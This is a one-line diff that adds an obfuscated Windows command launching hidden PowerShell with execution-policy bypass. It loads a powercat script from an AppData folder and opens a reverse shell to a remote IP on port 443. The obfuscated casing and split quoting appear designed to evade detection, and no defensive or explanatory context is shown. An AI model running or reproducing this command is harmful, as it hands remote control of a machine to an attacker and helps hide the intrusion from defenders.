@@ -1,0 +1,1 @@
+"C:\Windows\System32\cmd.exe" /c p"ower"shell -w hidden -exec bypass cd C:\Users\admin\AppData\Local\catchme\; . .\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute
